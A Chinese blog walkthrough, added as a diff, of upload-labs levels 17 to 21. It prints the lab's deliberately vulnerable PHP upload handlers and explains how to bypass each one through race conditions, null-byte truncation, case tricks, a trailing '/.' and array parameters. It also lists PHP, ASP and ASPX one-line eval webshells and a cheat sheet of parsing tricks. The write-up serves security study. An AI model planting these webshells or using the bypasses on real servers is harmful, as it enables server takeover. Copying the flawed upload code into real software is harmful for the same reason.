+                imagejpeg($im,$img_path);
+                @unlink($target_path);
+                $is_upload = true;
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+
+    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefrompng($target_path);
+
+            if($im == false){
+                $msg = &quot;该文件不是png格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                 //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.png&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.'/'.$newfilename;
+                imagepng($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;               
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+
+    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromgif($target_path);
+            if($im == false){
+                $msg = &quot;该文件不是gif格式的图片！&quot;;
+                @unlink($target_path);
+            }else{
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.gif&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.'/'.$newfilename;
+                imagegif($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+    }else{
+        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+    }
+}
+</code></pre>
+<p><strong>函数分析：</strong></p>
+<pre><code class="language-php">  [FILE数组内容](https://www.cnblogs.com/laijinquan/p/8682282.html)（_FILE[“file”][“tmp_name”];其中file为前台上传文件的名称，而tmp_name是包含路径的新的文件名。）
+
+        $_FILES[‘myFile’][‘name’] 客户端文件的原名称。
+        $_FILES[‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。
+        $_FILES[‘myFile’][‘size’] 已上传文件的大小，单位为字节。
+        $_FILES[‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的
+
+
+</code></pre>
+<p><strong>代码分析：</strong></p>
+<pre><code class="language-php">if (isset($_POST['submit'])){
+    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+    $filename = $_FILES['upload_file']['name'];/**/获得上传文件名字**
+    $filetype = $_FILES['upload_file']['type'];//**后缀类型**
+    $tmpname = $_FILES['upload_file']['tmp_name'];/**/临时文件名字**
+
+    $target_path=UPLOAD_PATH.'/'.basename($filename);//**获得临时文件的路径的名字**
+
+    // 获得上传文件的扩展名
+    $fileext= substr(strrchr($filename,&quot;.&quot;),1);/**/文件后缀**
+
+    //判断文件后缀与类型，合法才进行上传操作
+    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
+        if(move_uploaded_file($tmpname,$target_path)){**//将临时文件放在路径下面**
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromjpeg($target_path);//二次**渲染图片，并且检验图片是否为jpg的格式，并且返回ture或者false**
+
+            if($im == false){
+                $msg = &quot;该文件不是jpg格式的图片！&quot;;
+                @unlink($target_path);//**根据路径删除临时文件**
+            }else{
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.jpg&quot;;//**生成新图片的名字**
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.'/'.$newfilename;//**生成新图片的路径**
+                imagejpeg($im,$img_path);//**将新图片放到该路径下**
+                @unlink($target_path);//**删除临时图片**
+                $is_upload = true;
+            }
+        } else {
+            $msg = &quot;上传出错！&quot;;
+        }
+        
+
+</code></pre>
+<p><strong>验证过程：</strong>
+判断后缀与MIME类型是否符合要求，符合后生成新图像（内容不正确会失败，返回false，相当于多了一次验证），生成新图像失败就<code>unlink</code>删除，成功就根据系统时间给文件命名，再通过<code>imagejpeg</code>类似函数使用原图像资源创建新图像（二次渲染）。相关函数说明：</p>
+<pre><code class="language-php">basename(string $path [,string $suffix]) //返回路径中的文件名部分
+imagecreatefromjpeg(string $filename)
+imagecreatefrompng(string $filename) 
+imagecreatefromgif(string $filename) //由文件或URL创建一个新图像，内容不对则失败返回false，成功后返回图像资源
+srand([int $seed ]) //用seed播下随机数发生器种子
+strval(mixed $var) //返回字符串类型的var
+imagejpeg(resource $image [,string $filename [,int $quality]])//从image图像以filename为文件名创建一个JPEG图像
+imagepng(resource $image [,string $filename]) //从 image 图像以filename为文件名创建一个PNG图像或文件
+imagegif(resource $image [,string $filename]) //从 image 图像以filename为文件名创建一个GIF图像或文件
+</code></pre>
+<p><strong>解题姿势：</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924003433875.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924003452498.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>在相同位置中添加一句话木马后发现，这次没有消失</p>
+<p>利用文件包含漏洞，蚁剑连接</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924003545177.png#pic_center" alt="在这里插入图片描述" />
+
+这里只上传了gif文件，jpg和png有点复杂，暂时还没有弄懂&hellip;</p>
+<p>附个大佬博客链接，有详解：https://xz.aliyun.com/t/2657</p>
+<h3 id="pass-18">PASS-18</h3>
+<p>贴一下源码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+
+if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_name = $_FILES['upload_file']['name'];
+    $temp_file = $_FILES['upload_file']['tmp_name'];
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file = UPLOAD_PATH . '/' . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file)){
+        if(in_array($file_ext,$ext_arr)){
+             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        }else{
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        }
+    }else{
+        $msg = '上传出错！';
+    }
+}
+</code></pre>
+<p><strong>函数分析：</strong>
+<a href="https://www.runoob.com/php/func-filesystem-rename.html" target="_blank">rename() 函数</a> ：重命名文件或目录。
+如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。
+rename(oldname,newname,context)</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924003823906.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924003856477.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>代码分析：</strong></p>
+<pre><code class="language-php">if(isset($_POST['submit'])){
+    $ext_arr = array('jpg','png','gif');
+    $file_name = $_FILES['upload_file']['name'];//客户端的文件名
+    $temp_file = $_FILES['upload_file']['tmp_name'];//临时文件名路径名称
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);//截取文件的后缀
+    $upload_file = UPLOAD_PATH . '/' . $file_name;//拼接生成客户端文件的路径名称
+
+    if(move_uploaded_file($temp_file, $upload_file)){//将临时文件放到制定路径中
+        if(in_array($file_ext,$ext_arr)){//由此可见是白名单，因为只允许 jpg、png、gif 格式上传
+             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;//生成新的文件名
+             rename($upload_file, $img_path);//对文件进行重命名，并将新的文件目录覆盖到原来的文件目录上。
+             $is_upload = true;
+</code></pre>
+<p><strong>解题思路：</strong></p>
+<p><strong>条件竞争</strong></p>
+<p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。</p>
+<p>当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。</p>
+<p>尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。</p>
+<ul>
+<li>
+<p>如果文件检测是先保存后检测，文件不合法再删除的方式进行的，典型的“引狼入室”。</p>
+</li>
+<li>
+<p>当我们上传web shell文件时，不会先限制php类型文件上传，先利用上面的语句把上传的文件临时存放。再执行下面的if语句进行文件类型的限制和文件名的时间戳。然后执行</p>
+</li>
+<li>
+<p>就可以利用条件竞争的方式在木马文件在被删除之前访问它，使他成功的执行</p>
+</li>
+<li>
+<p>具体的操作过程就是，利用工具，一边不断地快速上传木马文件，一边不断的请求访问上传的木马文件，使一些来不及被删除的木马文件被成功执行</p>
+</li>
+</ul>
+<pre><code class="language-php">if(move_uploaded_file($temp_file, $upload_file))//移动到新文件夹
+</code></pre>
+<p><strong>解题姿势：</strong></p>
+<p>**利用文件重命名过程中有耗费时间的过程。临时webshell文件保存的极短时间，去访问webshell。获取一些信息。</p>
+<p><strong>我们可以利用burp多线程发包</strong>，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。（即当线程足够的时候 ，将可能会跳过某个步骤，而直接访问到我们的 <strong>webshell</strong> )</p>
+<p>**系统执行过程为：**当 jpg 图片上传时, 后台先生成图片的临时文件名$  tem_file路径，并且他也会拼接生成一个新的文件名 $ upoad_load路径，然后将临时文件名 $tem_file的路径放到新的文件名$ upoad_load的路径下面。之后对图片进行后缀检验 ，如果为白名单  jpg、png、gif的格式，那么将生成一个新的文件名 $ img_path路径, 并用新的路径名对之前的$ upoad_load的路径名  进行重命名覆盖。
+因此，我们可以利用判断白名单时间差，结合多线程不断地对系统发送图片马php文件，当线程足够时，然后我们便能利用这个时间差，即系统没有反应过来时绕过白名单判断，成功向在文件夹中发送图片马php文件）</p>
+<p>不断上传文件，在文件还没被删除前去读取文件，若上传内容为<code>&lt;?php fputs(fopen('2.php','w'),'&lt;?php @eval($_POST[&quot;111&quot;])?&gt;');?&gt;</code>，则还没被删除前去读取文件，解析之后会写入一个内容为<code>&lt;?php @eval($_POST[&quot;111&quot;])?&gt;</code>的<code>2.php</code>文件。使用BurpSuite的Intruder不断上传文件并不断访问所上传的文件。
+注：<code>&quot;pass&quot;</code>一定要双引号，不然单引号之间乱了。</p>
+<p><strong>下面上图：</strong></p>
+<p>还是先说一下思路吧：用BP抓一个上传包，再抓一个访问这个上传文件的包，然后用Intruder模块不断访问</p>
+<p>我这里将 webshell 命名为 3.php，然后用BP抓这个上传包</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004156622.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004217300.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004236654.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004320194.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201111123757380.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>再抓这个包，不断访问
+过程和抓到的上传包一样</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004449162.png#pic_center" alt="在这里插入图片描述" />
+
+upload文件夹上传成功2.php，蚁剑连接</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004515918.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004534746.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-19">PASS-19</h3>
+<p>贴一下代码，及代码分析</p>
+<pre><code class="language-php">//index.php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit']))
+{
+    require_once(&quot;./myupload.php&quot;);
+    $imgFileName =time();
+    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
+    //源码隐藏了，其实在这边MyUpload是一个类，这句代码的意思是定义 了MyUpload的类，
+    //名字为 $ u ，
+    $status_code = $u-&gt;upload(UPLOAD_PATH);
+    //这边也隐藏了函数，Upload为一个函数，将会返回以下 switch 里面case相关的值。
+    switch ($status_code) {
+        case 1://为正常格式
+            $is_upload = true;
+            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;  	break;
+        case 2:
+            $msg = '文件已经被上传，但没有重命名。';		break; 
+        case -1:
+            $msg = '这个文件不能上传到服务器的临时文件存储目录。';		break; 
+        case -2:
+            $msg = '上传失败，上传目录不可写。'; 		break; 
+        case -3:
+            $msg = '上传失败，无法上传该类型文件。';		break; 
+        case -4:
+            $msg = '上传失败，上传的文件过大。';		 break; 
+        case -5:
+            $msg = '上传失败，服务器已经存在相同名称文件。';		break; 
+        case -6:
+            $msg = '文件无法上传，文件不能复制到目标目录。';		break;      
+        default:
+            $msg = '未知错误！'; 		break;
+    }
+}
+//myupload.php
+class MyUpload{
+......
+  var $cls_arr_ext_accepted = array(
+      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
+      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );//黑名单
+......  
+  /** upload()
+   **
+   ** Method to upload the file.
+   ** This is the only method to call outside the class.
+   ** @para String name of directory we upload to
+   ** @returns void
+  **/
+  function upload( $dir ){
+    
+    $ret = $this-&gt;isUploadedFile();//文件是否成功上传
+    //$this-&gt;是指向对象的XXX。在这边&gt;isUploadedFile()是指函数是否是以POST形式上传，即能够判断函数是否可以返回成功。
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );
+    }
+    
+//**resultUpload（ $ret）**这个函数将会返回switch中case的相关值，从而确定switch函数的执行。
+//它的执行过程为  $ret 作为相关值传递给函数resultUpload（）（里面也是 switch的相关函数，
+从而达到返回 switch 中不同case的目的。）从而触发相关属性。
+
+    $ret = $this-&gt;setDir( $dir );//文件目录是否成功设置
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );
+    }
+
+    $ret = $this-&gt;checkExtension();//文件扩展名即后缀是否符合条件（黑名单）
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );
+    }
+
+    $ret = $this-&gt;checkSize();//文件大小是否符合条件
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );    
+    }
+    
+    // if flag to check if the file exists is set to 1
+    
+    if( $this-&gt;cls_file_exists == 1 ){//文件是否存在
+      
+      $ret = $this-&gt;checkFileExists();
+      if( $ret != 1 ){
+        return $this-&gt;resultUpload( $ret );    
+      }
+    }
+
+    // if we are here, we are ready to move the file to destination
+
+    $ret = $this-&gt;move();//是否成功复制上传，如果存在相同的文件名将不会成功上传
+    if( $ret != 1 ){
+      return $this-&gt;resultUpload( $ret );    
+    }
+
+    // check if we need to rename the file
+
+    if( $this-&gt;cls_rename_file == 1 ){  //是否用$im_path成功给$upload_file重命名
+      $ret = $this-&gt;renameFile();
+      if( $ret != 1 ){
+        return $this-&gt;resultUpload( $ret );    
+      }
+    }
+    
+    // if we are here, everything worked as planned :)
+
+    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
+  
+  }
+......
+</code></pre>
+<p>百度说这个和18题思路一样，但是我BP传了半天也没发现php文件&hellip;而且，还没上传到upload文件夹下，上传的是upload的上一层文件夹&hellip;不知道什么原因，如果有大佬知道的话可以告诉一下小弟&hellip;谢谢</p>
+<p>这里是利用了一个也算是竞争吧的方法</p>
+<p>通过这个代码</p>
+<p><code>if( $this-&gt;cls_rename_file == 1 ){  //是否用$im_path成功给$upload_file重命名</code></p>
+<p>这边和第17关有点类似，都对关键进行了重命名，由于我们是利用burp不断的发送相同的包，那么一旦有两个包同时传到这边是，那么系统对一个重命名时，另一个刚好“逃脱”了，那么上传成功。</p>
+<p><strong>解题姿势：</strong></p>
+<p>在这关是一个白名单，利用了appche的一个解析漏洞，它会将 “ .php.7z ” 当作 .php来解析，而刚好 “ .php.7z  ”又属于白名单，所以上传一个 “ .php.7z ” 的文件，然后 再利用条件竞争漏洞进行多线程不断的发送 “  .php.7z”的文件，由于版本问题，这次的文件没有上传到upload的文件夹下面，而是上传到 WWW  的文件夹下面，但是不影响，并且这次的文件上传后就<strong>不会被删掉</strong>，就会保存在 该文件夹下面，这样的话我们将可<strong>以稳定的访问到</strong>。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004744504.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>但是又感觉不是很对，我最后是利用了文件包含漏洞&hellip;但是题目中没有说可利用文件包含漏洞&hellip;我是用文件包含漏洞访问的</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004812827.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-20">PASS-20</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = $_POST['save_name'];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) { 
+                $is_upload = true;
+            }else{
+                $msg = '上传出错！';
+            }
+        }else{
+            $msg = '禁止保存为该类型文件！';
+        }
+
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+
+</code></pre>
+<p><strong>函数分析：</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924004945606.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005002373.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>源码分析：</strong></p>
+<pre><code class="language-php">if (file_exists(UPLOAD_PATH)) {
+    //黑名单
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name = $_POST['save_name'];
+        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//**返回文件后缀名**
+
+        if(!in_array($file_ext,$deny_ext)) {//黑名单判断
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) { 
+                $is_upload = true;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005114883.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>如下，由源码可得，最后图片的名字 $file_name 拼接而成，因此如果在中途将 $file_name 换掉，最开始 $file_name = upload-19.jpg，如果我们中途将他换成 upload-19.php +(二进制00截断)那么便可以以我们想要的格式执行。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005140929.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>解题姿势一：</strong>
+00截断</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005216765.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005232265.png#pic_center" alt="在这里插入图片描述" />
+
+上传成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005330654.png#pic_center" alt="在这里插入图片描述" />
+蚁剑连接成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005348126.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>绕过姿势二：</strong></p>
+<p>大写绕过</p>
+<p>可以发现黑名单都是小写，所以可以利用大写绕过</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005434871.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005452528.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005506134.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>蚁剑连接成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005540661.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>绕过姿势三：</strong></p>
+<p>move_uploaded_file()有一个trick，会忽略掉文件末尾的<code>/.</code>。这里是用户可控的。</p>
+<p>move_uploaded_file会忽略掉文件末尾的/.
+所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p>
+<p>post: save_name = 1.php/.</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005649101.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005703439.png#pic_center" alt="" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005711161.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="pass-21">PASS-21</h3>
+<p>贴一下代码：</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if(!empty($_FILES['upload_file'])){
+    //检查MIME
+    $allow_type = array('image/jpeg','image/png','image/gif');
+    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+        $msg = &quot;禁止上传该类型文件!&quot;;
+    }else{
+        //检查文件名
+        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+        if (!is_array($file)) {
+            $file = explode('.', strtolower($file));
+        }
+
+        $ext = end($file);
+        $allow_suffix = array('jpg','png','gif');
+        if (!in_array($ext, $allow_suffix)) {
+            $msg = &quot;禁止上传该后缀文件!&quot;;
+        }else{
+            $file_name = reset($file) . '.' . $file[count($file) - 1];
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $msg = &quot;文件上传成功！&quot;;
+                $is_upload = true;
+            } else {
+                $msg = &quot;文件上传失败！&quot;;
+            }
+        }
+    }
+}else{
+    $msg = &quot;请选择要上传的文件！&quot;;
+}
+
+</code></pre>
+<p>相比较于上一关的源码，此处服务器端先是检查了MIME类型，然后判断save_name参数是否为空，为空就把文件本来名称赋值给$file,否则就是将save_name参数的值赋给它。紧接着判断$file是否是数组。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924005831318.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>如果不是数组则将其拆成数组，然后数组最后一个的值(end函数就是取数组最后一个的值)同白名单做比较，符合jpg、png、gif中的一种就允许上传了。</p>
+<p>在允许上传之后还要把数组的值拼接在一起对文件进行重命名。所以我们可以构造save_name[0]=1.php/  save_name[1]置为空  save_name[2]=jpg(一个白名单的合法后缀)。</p>
+<p>这样的话，reset($file)取的是数组的第一个元素即1.php/，然后接了一个'.&lsquo;符号，之后又将数组最后一个元素内容拼接到一起。</p>
+<p>可能有的人会疑问数组最后一个值不是jpg吗？其实当我们只设置了两个数组元素的时候，数组的元素个数就只有两个了。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924010122404.png#pic_center" alt="在这里插入图片描述" />
+
+既然一共只有两个元素，这里就是$file[2-1]也就是$file[1]。因此拼接的就是空的，最终得到的文件名就是1.php/.。</p>
+<p>对于像1.php/.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的/.。如此一来我们上传到服务器的文件还是被重命名为了php后缀。</p>
+<p>第一步：上传文件，抓包修改参数</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924010147616.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020092401015939.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>蚁剑连接：</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20200924010211652.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>拓展：</strong>
+1、一句话木马：
+指的是一句简单的脚本语言。</p>
+<blockquote>
+<p>php：<?php @eval($_post['pass']);?>
+asp：&lt;%eval request (&ldquo;pass&rdquo;)%&gt;
+aspx：&lt;%@ Page Language=&ldquo;Jscript&rdquo;%&gt; &lt;%eval(Request.Item[&ldquo;pass&rdquo;],&ldquo;unsafe&rdquo;);%&gt;</p>
+</blockquote>
+<p>web变种一句话</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+$_GET['POST']($_POST['GET']);
+?&gt;
+
+</code></pre>
+<pre><code class="language-php">&lt;?php 
+$POST['POST']='assert';
+$array[]=$POST;
+$array[0]['POST']($_POST['assert']);
+?&gt;
+</code></pre>
+<p>文件上传漏洞巧妙绕过：</p>
+<p>链接1：（内容很全，概括的也多的，并且引用详细，如果不清楚值得做参考。）
+<a href="https://www.cnblogs.com/shellr00t/p/6426945.html" target="_blank">点击</a></p>
+<p>总结：</p>
+<pre><code>（1）、寻找上传点–&gt;上传木马
+（2）、XSS被动攻击
+首先判断版本IS6.0的解析漏洞
+（1）、没有过滤：四种工具（过waf的能力）：菜刀、冰蝎、蚁剑、
+没有使用白名单的都会有问题。传上去：&lt;–找文件路径（1、路劲：反弹路径名称、post，request，可能直接显示网页，2、不知路径：爆破目录—&gt;upload路劲）
+二、规定只能，，，
+黑名单：必须上传
+
+    制作图片马（无法直接解释执行），执行办法：
+
+    1、定义路径，.php…asp等
+    2、。htaccsee采用，，，规则，自己定义后缀
+    3、采用include方式，把图片引用到某一个php中运行，（后台当中）,利用后台
+    4、其他，is的解析漏洞,cer，php3,php4,php5，
+    5、其他：多能空间（什么文件都可运行），tomcat（），运行php，
+    6、00截断（各种截断，利用为协议或者保存时文件发生改变），.php%00jpe
+    7、客户端验证：全部都可以绕过
+    8、操作系统特性：例如：文件 只能存288个字符如果没有哈希，那么可以利用，Windows7.0，Windows8.0等等
+    9、后台保存路径和后缀名的默认格式：模板编辑器（保存配置）例如：config.php 封闭前面
+</code></pre>
+<p>文件解析漏洞（即中间件漏洞）</p>
+<p>关于以上漏洞的相关原理，例如00截断，空格截断等等。
+文件解析漏洞：是指中间件（Apache、nginx、iis等）在解析文件时出现了漏洞，从而，黑客可以利用该漏洞实现非法文件的解析。
+链接：<a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDMzNjYxOA==&amp;mid=2247485162&amp;idx=1&amp;sn=e3159fa1ac7725f165e30133071dbf4d&amp;source=41#wechat_redirect" target="_blank">点击</a></p>
+<p>（1）、PHP解析漏洞
+Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，一直到找到可识别后缀为止，然后将该可识别后缀进解析。Apache的文件解析过程是从右到左开始判断解析,如果为不可识别的后缀解析,就再往左判断。</p>
+<p>在Apache的解析中，除了“php|php3|phtml”等规定的后缀中，任何的后缀加入，都是不会被识别解析的，也会被跳过后缀处理。</p>
+<p>（2）、PHP CGI解析漏洞
+当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问http://www.xxxx.com/a.txt/a.php时，若a.php不存在，则PHP会递归向前解析，将a.txt当作php脚本来解析。</p>
+<p>IIS中：任意文件名/任意文件名.php就会被解析为php</p>
+<p>Nginx中：任意文件名/任意文件名.php就会被解析为php</p>
+<p>（3）、操作系统限制解析漏洞
+由于windows系统会将文件的后缀名中空格以及点进行过滤，如果遇到是黑名单校验的，如限制不允许上传PHP文件，而受害者系统又是windows系统，那么我们可以上传jaky.php ,或者jaky.php.通过这种方式就可以绕过黑名单检验的文件上传。</p>
+<p>（4）、文件头欺骗漏洞
+一般GIF图片用文本编辑器打开的时候，可以看到文件头是采用了“GIF89a”的字样。
+（5）filepath/filetype漏洞
+filepath漏洞是为了防止上传文件被重新命名归置文件而诞生的另一种攻击手段。我们可以Burp抓包来更改数据包里面的内容。将“filepath”中加入自己创建的路径名来篡改上传的文件的路径。
+2、filetype漏洞主要的利用方式是利用请求数据包中的“content-type”字段.将正常请求数据包中的“content-type:images/jpeg”更改为“content-type:text/asp”再对请求的文件进行空字节截断的方式配合攻击。
+（6）、空字节截断利用漏洞（%00）
+（7）、iconv函数限制上传
